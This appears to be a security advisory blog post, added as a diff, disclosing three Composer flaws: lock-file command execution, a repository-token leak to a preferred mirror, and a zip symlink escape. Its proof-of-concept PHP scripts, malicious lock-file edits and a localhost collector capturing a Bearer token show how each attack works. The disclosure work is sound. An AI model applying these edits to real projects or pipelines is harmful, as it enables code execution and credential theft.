@@ -1,0 +1,436 @@
+---
+title: 'We Found 3 CVEs in Composer: Command Execution, a Token Leak and a Zip Escape'
+summary: "We found three vulnerabilities in Composer, the PHP package manager. One extra key in composer.lock could make Composer run a command during install, even with plugins and scripts switched off (CWE-78), another could hand a private repository's token to an attacker's mirror (CWE-522), and a crafted package zip could write outside its own folder when unzip failed and ZipArchive took over (CWE-22). All three are fixed in Composer 2.11.2, and the two that reach the 2.2 LTS line are fixed in 2.2.32. Tracked as GHSA-jhfp-4ppm-crmm, GHSA-x82q-x274-r6pq and GHSA-w6hj-6587-3jh5."
+date: '2026-11-11'
+lastmod: '2026-11-11'
+authors: ['appsec-research']
+category: 'research-advisories'
+tags:
+  [
+    'composer',
+    'php',
+    'supply-chain',
+    'command-injection',
+    'credential-leak',
+    'zip-slip',
+    'path-traversal',
+    'cwe-78',
+    'cwe-522',
+    'cwe-22',
+    'vulnerability-research',
+    'case-study',
+    'disclosure',
+    'appsec',
+  ]
+draft: false
+layout: PostSimple
+canonicalUrl: 'https://shellvoide.com/blog/composer-lockfile-rce-token-leak-zip-slip'
+system: 'Composer (PHP)'
+advisories:
+  - id: 'GHSA-jhfp-4ppm-crmm'
+    url: 'https://github.com/composer/composer/security/advisories/GHSA-jhfp-4ppm-crmm'
+    label: 'Command execution'
+    severity: 'High'
+    score: 8.8
+    affected: '>= 2.10.0, < 2.11.2'
+    fixed: '2.11.2'
+  - id: 'GHSA-x82q-x274-r6pq'
+    url: 'https://github.com/composer/composer/security/advisories/GHSA-x82q-x274-r6pq'
+    label: 'Token leak'
+    severity: 'Medium'
+    score: 6.5
+    affected: '2.11.0, 2.11.1, 2.2.31'
+    fixed: '2.11.2, 2.2.32'
+  - id: 'GHSA-w6hj-6587-3jh5'
+    url: 'https://github.com/composer/composer/security/advisories/GHSA-w6hj-6587-3jh5'
+    label: 'Zip escape'
+    severity: 'High'
+    score: 8.8
+    affected: '>= 1.0, < 2.2.32 and >= 2.3.0, < 2.11.2'
+    fixed: '2.11.2, 2.2.32'
+---
+
+Composer printed a URL, refused to download it, and stopped. A failed install is about the most ordinary thing a package manager does. What made us look twice was who printed the URL. Composer hadn't. `printf` had, and Composer had called `printf` itself, in the middle of `composer install --no-plugins --no-scripts`, because one key in `composer.lock` told it to.
+
+Put `system` where `printf` was and the URL stops being printed. It gets run instead, and the person who wrote that key also wrote the URL.
+
+**TL;DR.** We found three vulnerabilities in Composer, the package manager behind almost every modern PHP project. Two of them start with nothing more than an edit to `composer.lock`, a file that dependency bots rewrite all day and reviewers rarely open.
+
+- On Composer 2.10.0 to 2.11.1, one key in a lock entry runs a command on whatever machine runs `composer install`, before any download is checked and with plugins and scripts switched off.
+- On 2.11.0, 2.11.1 and 2.2.31, another key sends a private repository's token to a server the attacker picks, and the install still succeeds.
+- On every release before the fix, back to 1.0, a crafted package archive from an untrusted source can write files outside its own folder when `unzip` fails and Composer falls back to PHP's `ZipArchive`.
+
+Composer 2.11.2 and 2.2.32 fix all three. If a lock file you didn't write can reach a machine that runs Composer, run `composer self-update` now and read the rest after.
+
+## Why one file is enough
+
+A lock file is supposed to be a receipt. `composer.json` says what a project wants, usually as a range like "any 3.x version of this library". `composer.lock` records exactly what got picked, down to the commit and the URL of the zip, and `composer install` fetches exactly that, so every machine ends up with the same code. A second file, `vendor/composer/installed.json`, records what's installed and gets read back the same way. Neither file is supposed to be able to do anything.
+
+Both of them change hands constantly, though. A pull request that touches only `composer.lock` is routine, and GitHub folds a big lock diff away under "Large diffs are not rendered by default", where it tends to stay. Dependency bots open those pull requests by the dozen. Project templates ship with lock files, and CI caches restore them between runs. Then the first thing most pipelines do with a fresh checkout is run `composer install`, with deploy keys and registry tokens sitting in the environment.
+
+So the question we cared about was narrow. Can anything written in a lock file make Composer act, rather than describe?
+
+## It started with someone else's fix
+
+On 29 October 2026, Composer 2.11.0 fixed GHSA-fm2w-xgf2-f9fh. Inline repository headers, API tokens included, had been getting written into `composer.lock`. The repair was sensible. Strip the headers when the lock is written, and put them back when it's read.
+
+Putting a secret back at read time has a cost. For a moment, text from a file anyone can edit in a pull request and a credential nobody should see sit in the same object. We wanted to know what else came along for the ride.
+
+KLUE, our automation, listed everything a lock entry is allowed to carry into a live package. In 2.11.1 the loader copies 29 top-level keys from each entry, plus the dependency lists. Nearly all of them are facts, like names, versions, licenses and URLs. Two of them are instructions, `transport-options` and the dist `mirrors`, and each one turned into a finding. The third came from a different question, about what Composer does when its first attempt at unzipping a package fails.
+
+We reported all three to the Composer maintainers on 5 November, a few minutes apart. The fixes shipped five days later.
+
+## 1. A safety hook that calls whatever it's named
+
+Since Composer 2.10, the downloader honors two optional hooks, `prevent_url_access_callable` and `prevent_ip_access_callable`. They exist for tools that embed Composer. You hand Composer a function, and before every download it asks that function whether the URL, or the IP behind it, should be blocked.
+
+The hooks live in a package's transport options, and 2.11.1 copied a package's transport options straight out of the lock file.
+
+```php {3-4} showLineNumbers
+// src/Composer/Package/Loader/ArrayLoader.php at 2.11.1
+// (loadOptions is true when composer.lock and installed.json are read, comment ours)
+if ($this->loadOptions && isset($config['transport-options'])) {
+    $package->setTransportOptions($config['transport-options']);
+}
+```
+
+Before each download, the curl-based downloader consults the hook.
+
+```php {4-5} showLineNumbers
+// src/Composer/Util/Http/CurlDownloader.php at 2.11.1
+if (
+    isset($options['prevent_url_access_callable']) &&
+    is_callable($options['prevent_url_access_callable']) &&
+    $options['prevent_url_access_callable']($url)
+) {
+    throw new TransportException('Access to "'.Url::sanitize($url).'" is blocked.');
+}
+```
+
+The first highlighted line reads like a type check, and it barely is one. In PHP, `is_callable()` accepts any string that names a function. `"printf"` passes. So does `"system"`.
+
+A lock entry carrying `"prevent_url_access_callable": "system"` turns the second highlighted line into `system($url)`, and the URL comes from the same entry. It happens while Composer is still working out the download, before a single byte is checked against a hash, and `--no-plugins` and `--no-scripts` never come near this code.
+
+The smallest way to watch it happen is to feed a lock entry through those two lines, with `printf` standing in for anything that has side effects.
+
+```php {8,23-24} showLineNumbers
+<?php
+// poc_callable.php  ·  php poc_callable.php  ·  no Composer needed
+// The two lines of Composer 2.11.1 that matter, fed a package entry from a lock file.
+
+$lockEntry = json_decode('{
+    "name": "acme/demo",
+    "dist": {"type": "zip", "url": "https://example.invalid/acme/demo.zip"},
+    "transport-options": {"prevent_url_access_callable": "printf"}
+}', true);
+
+$url = $lockEntry['dist']['url'];
+
+// ArrayLoader (2.11.1): transport-options from the lock are copied onto the package as they are
+$options = $lockEntry['transport-options'];
+
+echo "is_callable('printf') = ", var_export(is_callable('printf'), true), "\n";
+echo "is_callable('system') = ", var_export(is_callable('system'), true), "\n\n";
+
+// CurlDownloader (2.11.1): the check that runs before every download
+echo "2.11.1 runs the lock's choice: ";
+if (
+    isset($options['prevent_url_access_callable']) &&
+    is_callable($options['prevent_url_access_callable']) &&
+    $options['prevent_url_access_callable']($url)
+) {
+    echo "\n  -> download refused, after running a function the lock file picked\n\n";
+}
+
+// 2.11.2: ArrayLoader drops the option, and CurlDownloader only accepts a real Closure
+$fromLock = $options['prevent_url_access_callable'];
+echo "2.11.2 sees a ", get_debug_type($fromLock), ": ",
+    $fromLock instanceof \Closure ? "accepted\n" : "rejected, only a Closure is allowed\n";
+```
+
+```text
+is_callable('printf') = true
+is_callable('system') = true
+
+2.11.1 runs the lock's choice: https://example.invalid/acme/demo.zip
+  -> download refused, after running a function the lock file picked
+
+2.11.2 sees a string: rejected, only a Closure is allowed
+```
+
+The URL after "runs the lock's choice" is `printf` executing. Swap the name and a different function runs. The fixed release sees the same value as an ordinary string and turns it away.
+
+### Against the real thing
+
+For the live runs we used Composer's own release builds of 2.11.1 and 2.11.2, checked against the SHA-256 sums published on getcomposer.org, on PHP 8.4.24 with Info-ZIP UnZip 6.00. PHP's built-in web server played two parts. On port 8097 it was a private Composer repository serving one package, `acme/demo`, and the project's `composer.json` gave that repository an `Authorization: Bearer lab-repo-token` header. On port 8096 it was the attacker, logging the Authorization header of every request and answering 404. Packagist, `secure-http` and Composer's audit and blocking features were switched off, so nothing left localhost.
+
+We let 2.11.2 write an honest lock file, then made the one edit a malicious pull request would make. In the output below we've trimmed the usage text Composer prints after an error.
+
+```json
+"transport-options": {
+    "prevent_url_access_callable": "printf"
+}
+```
+
+```text
+===== composer 2.11.1 install --no-plugins --no-scripts
+Installing dependencies from lock file (including require-dev)
+Verifying lock file contents can be installed on current platform.
+Package operations: 1 install, 0 updates, 0 removals
+  - Downloading acme/demo (1.0.0)
+Warning: Accessing 127.0.0.1 over http which is an insecure protocol.
+http://127.0.0.1:8097/dists/demo.zip    Failed to download acme/demo from dist: Access to "http://127.0.0.1:8097/dists/demo.zip" is blocked.
+In CurlDownloader.php line 220:
+
+  Access to "http://127.0.0.1:8097/dists/demo.zip" is blocked.
+
+===== composer 2.11.2 install --no-plugins --no-scripts
+Installing dependencies from lock file (including require-dev)
+Verifying lock file contents can be installed on current platform.
+Package operations: 1 install, 0 updates, 0 removals
+  - Downloading acme/demo (1.0.0)
+Warning: Accessing 127.0.0.1 over http which is an insecure protocol.
+  - Installing acme/demo (1.0.0): Extracting archive
+Generating autoload files
+```
+
+That bare URL at the start of the long 2.11.1 line is the one from the opening of this post, printed by `printf`, which Composer ran during `install --no-plugins --no-scripts` because a data file asked it to. `printf` returns a number, Composer reads that as "block it", and the install stops, which for a proof of concept is a very polite way to fail. A function that does more than print would simply do more. On 2.11.2 the same lock file installs normally.
+
+It didn't work on the first try. The first run died with a different error, because our PHP build had no curl extension, and without curl Composer downloads through an older transport that refuses the option outright. So the bug lives only on the curl path. Nearly every real PHP installation has curl, and adding it to the lab was all it took.
+
+## 2. The token the fix put back
+
+Private Composer repositories, common with Private Packagist and Satis-style setups, often authenticate with a header set right in `composer.json`, such as an `Authorization: Bearer` token in the repository's `options`. Since the 2.11.0 fix, that header never reaches the lock file. When Composer reads a lock entry, it works out which repository the package belongs to and puts that repository's header back.
+
+```php {6-9} showLineNumbers
+// src/Composer/Repository/RepositoryManager.php at 2.11.1  (lightly trimmed)
+public function restoreHttpHeaders(PackageInterface $package): void
+{
+    $options = $package->getTransportOptions();
+    // ... early returns for aliases and packages that already carry a header
+    $headers = $this->findHttpHeaders($package);
+    if ($headers !== null) {
+        $options['http']['header'] = $headers;
+        $package->setTransportOptions($options);
+    }
+}
+```
+
+`findHttpHeaders()` decides ownership by asking each repository whether the package is one of its own.
+
+```php {4} showLineNumbers
+// src/Composer/Repository/ComposerRepository.php at 2.11.1
+public function isOwnDistUrl(PackageInterface $package): bool
+{
+    foreach ($package->getDistUrls() as $url) {
+        // require a boundary after the base URL so e.g. https://example.org.example.net does not match https://example.org
+        if (Preg::isMatch('{^'.preg_quote($this->baseUrl).'(?:[/?#]|$)}', $url)) {
+            return true;
+        }
+    }
+
+    return false;
+}
+```
+
+The highlighted loop walks every URL the package has, meaning the canonical dist URL plus every mirror in its entry, and the lock file writes all of them. One more detail settles it. A mirror marked `preferred` jumps to the front of the queue.
+
+```php
+// src/Composer/Package/Package.php at 2.11.1, inside getUrls()
+$func = $mirror['preferred'] ? 'array_unshift' : 'array_push';
+$func($urls, $mirrorUrl);
+```
+
+So an edited entry keeps the real repository URL as its canonical dist URL, which is enough for the header to come back, and adds a preferred mirror on a host the attacker runs. Composer's first request for the package goes to the attacker with the token attached. When that host answers 404, Composer moves on to the real URL, the install succeeds, and nothing on screen looks wrong.
+
+In the lab, the edit was one preferred mirror in the package's `dist` entry. The output is trimmed to the lines that matter, and its first line is our own check of the lock file.
+
+```json
+"mirrors": [
+    { "url": "http://127.0.0.1:8096/%package%.%type%", "preferred": true }
+]
+```
+
+```text
+token occurrences in composer.lock: 0
+
+===== composer 2.11.1 install
+  - Downloading acme/demo (1.0.0)
+    Failed downloading acme/demo, trying the next URL (404: The "http://127.0.0.1:8096/acme/demo.zip" file could not be downloaded (HTTP/1.1 404 Not Found))
+  - Downloading acme/demo (1.0.0)
+  - Installing acme/demo (1.0.0): Extracting archive
+collector log:
+    /acme/demo.zip  Authorization: Bearer lab-repo-token
+
+===== composer 2.11.2 install
+  - Downloading acme/demo (1.0.0)
+    Failed downloading acme/demo, trying the next URL (404: The "http://127.0.0.1:8096/acme/demo.zip" file could not be downloaded (HTTP/1.1 404 Not Found))
+  - Downloading acme/demo (1.0.0)
+  - Installing acme/demo (1.0.0): Extracting archive
+collector log:
+    /acme/demo.zip  Authorization: (none)
+```
+
+Zero occurrences means the 2.11.0 fix was doing its job, and the token really was gone from the lock file. 2.11.1 put it back and handed it to the attacker's host anyway. Both installs finished, and the only trace was one line about trying the next URL. On 2.11.2 the attacker's server got the request and nothing else.
+
+## 3. Two unzippers, one folder
+
+Composer prefers the system `unzip` command and keeps PHP's own `ZipArchive` as a fallback. When `unzip` exits with an error, Composer tries again with `ZipArchive`, in the same directory.
+
+```php {5,10} showLineNumbers
+// src/Composer/Downloader/ZipDownloader.php at 2.11.1  (lightly trimmed)
+return $promise->then(function (Process $process) use ($tryFallback, $command, $package, $file) {
+    if (!$process->isSuccessful()) {
+        // ...
+        return $tryFallback(new \RuntimeException('Failed to extract '.$package->getName().': ...'));
+    }
+});
+
+// ...and in the fallback, extractWithZipArchive(), after a zip-bomb size check:
+$extractResult = $zipArchive->extractTo($path);
+```
+
+`unzip` restores symlink entries as real symlinks. If it creates one and then fails partway through, the link stays behind in the directory. `ZipArchive::extractTo()` doesn't treat an existing symlink as anything special and writes straight through it, so an entry stored under the link's name lands wherever the link points. The advisory's example target is a front controller like `public/index.php` in the project root, which runs on the next request.
+
+This one needs more than a lock file edit. The archive itself has to come from somewhere the attacker controls, such as an untrusted third-party repository, a mirror or a hijacked dist URL. Archives for ordinary Packagist.org packages don't carry the entries it relies on.
+
+The step that matters is a write through a link that's already sitting in the target directory, and PHP's real `ZipArchive` shows it in a few lines.
+
+```php {12,26} showLineNumbers
+<?php
+// poc_zip.php  ·  php poc_zip.php  ·  Linux or macOS, needs the PHP zip extension
+// ZipArchive::extractTo() writes through a symlink that is already in the target directory.
+
+function lab(bool $cleanFirst): string
+{
+    $lab = sys_get_temp_dir().'/zip-lab-'.bin2hex(random_bytes(4));
+    mkdir("$lab/outside", 0777, true);
+    mkdir("$lab/pkg", 0777, true);
+
+    // what an interrupted `unzip` run can leave in the extraction directory
+    symlink("$lab/outside", "$lab/pkg/link");
+
+    // an ordinary archive whose only entry path goes through that name
+    $zip = new ZipArchive();
+    $zip->open("$lab/demo.zip", ZipArchive::CREATE);
+    $zip->addFromString('link/written.txt', "hello from inside the archive\n");
+    $zip->close();
+
+    if ($cleanFirst) {                              // what 2.11.2 does before falling back
+        exec('rm -rf '.escapeshellarg("$lab/pkg"));
+        mkdir("$lab/pkg");
+    }
+
+    $zip->open("$lab/demo.zip");
+    $zip->extractTo("$lab/pkg");                    // the 2.11.1 fallback
+    $zip->close();
+
+    return is_file("$lab/outside/written.txt") ? 'outside the package directory' : 'inside the package directory';
+}
+
+echo "2.11.1 fallback wrote the file ", lab(false), "\n";
+echo "2.11.2 fallback wrote the file ", lab(true), "\n";
+```
+
+```text
+2.11.1 fallback wrote the file outside the package directory
+2.11.2 fallback wrote the file inside the package directory
+```
+
+The archive in that script is completely ordinary. The danger is the leftover link, and emptying the directory first, which is the whole 2.11.2 fix, makes the same archive land where it belongs.
+
+We haven't published a live archive for this one. Getting `unzip` to plant a link and then fail is the part we're keeping back while people upgrade.
+
+> [!WARNING]
+> Run these only in a throwaway project on a machine you own, with test credentials rather than real ones, and point any mirror only at a server you control. If you run Composer anywhere a lock file you didn't write might arrive, upgrade to `2.11.2` (or `2.2.32` on the LTS line) before you experiment.
+
+## Why nobody noticed
+
+Lock files are folded in review and often merged on a bot's say-so. Dependency scanners do read them, but for package names and versions to check against advisory databases, and none of them asks what `transport-options` or `mirrors` will make Composer do. Static analysis sees `is_callable()` and treats whatever made it past as checked. The zip bug sits in an error path, the fallback after a failed extraction, which is the code a test suite exercises least.
+
+And nothing here looks like an exploit. There's no odd byte sequence and no injected quote, just valid JSON with a reasonable-sounding option in it.
+
+## Who's exposed
+
+| Advisory            | You're exposed if                                                                                                           | What an attacker gets                                                              | You're not exposed if                                                             |
+| ------------------- | --------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- | --------------------------------------------------------------------------------- |
+| GHSA-jhfp-4ppm-crmm | you run 2.10.0 to 2.11.1 and run `install` or `update` on a lock or installed file someone else could change                | any command, as the user running Composer, before any integrity check              | nothing untrusted can modify those files, or you're on 2.2 LTS or older than 2.10 |
+| GHSA-x82q-x274-r6pq | you run 2.11.0, 2.11.1 or 2.2.31, a repository uses an inline header credential, and someone else could change your lock    | that repository credential                                                         | your repositories don't use inline header credentials                             |
+| GHSA-w6hj-6587-3jh5 | you run 1.0 to 2.11.1, install archives from a source an attacker controls, and have both `unzip` and the PHP zip extension | a file written outside the package directory, and code execution if that file runs | every package you install comes from a trusted source such as Packagist.org       |
+
+The two High ratings share the vector `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`. The poisoned file or archive arrives over the network, nothing about the attack is fiddly, the attacker needs no account on your systems, and someone has to run Composer, which is exactly what CI does all day. After that, the machine running Composer is fully exposed. The credential bug scores 6.5 on the same vector with only confidentiality affected, because what leaks is the token and nothing else.
+
+The advisory's own top scenario is the one to plan for. A CI job checks out a pull request branch and runs `composer install` with secrets in its environment, before any human has looked at the lock file change.
+
+## What 2.11.2 changed
+
+Each fix is small and aimed at the exact assumption that failed. The loader now refuses to take either hook from a file, and the downloader refuses anything that isn't a real closure.
+
+```php
+// ArrayLoader at 2.11.2
+$transportOptions = $config['transport-options'];
+// these options are invoked as callables while downloading, so they must never be
+// taken from externally provided package data such as the lock or installed.json
+unset($transportOptions['prevent_url_access_callable'], $transportOptions['prevent_ip_access_callable']);
+$package->setTransportOptions($transportOptions);
+
+// CurlDownloader at 2.11.2
+$options['prevent_url_access_callable'] instanceof \Closure &&
+```
+
+Ownership is now decided by the canonical dist URL alone, and the downloader drops repository headers for any URL on a different origin.
+
+```php
+// ComposerRepository::isOwnDistUrl() at 2.11.2
+// only match on the canonical dist URL, never on mirrors, which may come from untrusted
+// lock/installed data
+return Preg::isMatch('{^'.preg_quote($this->baseUrl).'(?:[/?#]|$)}', $url);
+
+// FileDownloader at 2.11.2
+if (isset($transportOptions['http']['header']) && ($canonicalDistOrigin === '' || $urlOrigin($url['processed']) !== $canonicalDistOrigin)) {
+    unset($transportOptions['http']['header']);
+```
+
+And the zip fallback starts from an empty directory.
+
+```php
+// ZipDownloader::extractWithZipArchive() at 2.11.2
+// extract into a clean directory: a previous extractor (the unzip command tried
+// before falling back here) may have created symlinks, which extractTo() would
+// follow and write through to paths outside the target directory
+$this->filesystem->removeDirectory($path);
+$this->filesystem->ensureDirectoryExists($path);
+```
+
+To upgrade, run one of these, the second if you're on the LTS line.
+
+```bash
+composer self-update 2.11.2
+```
+
+```bash
+composer self-update 2.2.32
+```
+
+No setting stands in for the upgrade. Until it's done, don't let CI run `composer install` on lock file changes from untrusted pull requests while secrets are in scope.
+
+## Facts and instructions
+
+All three bugs rest on the same assumption, that a file Composer wrote is a file Composer can trust when it reads it back. Two of the fixes come down to one rule, and it's the one we'd hand to anyone building a tool that reads its own files. Sort every field into facts and instructions, and never load an instruction from disk. Names, versions and URLs can come from a lock file. Callbacks, and anything that decides where a credential goes, can't. The zip fix adds a smaller rule of its own. When a fallback retries in the same place, clean the place first.
+
+## Disclosure and credits
+
+- **29 October 2026.** Composer 2.11.0 fixes GHSA-fm2w-xgf2-f9fh and stops writing inline repository headers into `composer.lock`.
+- **30 October 2026.** Composer 2.11.1 is released.
+- **5 November 2026.** We report all three issues as private GitHub security advisories.
+- **10 November 2026.** Composer 2.11.2 and 2.2.32 ship the fixes, and the three advisories are published.
+
+None of the three had a CVE ID when we published this, so the GHSA IDs are the ones to watch. On each advisory, president-xd from our team is listed as the reporter, and hash3liZer and eros938 as analysts.
+
+The same release carries four more security fixes beyond ours, covering repository headers being resent across redirects to another origin, settings read from a project's `auth.json`, blocked IPs being rejected only after a request was sent, and an update to the bundled symfony/filesystem. It's worth taking for those alone. Thanks to Jordi Boggiano and the Composer maintainers for turning three reports into one release in five days.
+
+The lock file will go on being folded in pull requests. After 2.11.2 that's fine again, because the only thing it can do is describe what's installed.
+
+---
+
+_Want a read like this against your own build pipeline? Book an engagement at [shellvoide.com/book](https://shellvoide.com/book), or reach us at [info@shellvoide.com](mailto:info@shellvoide.com)._
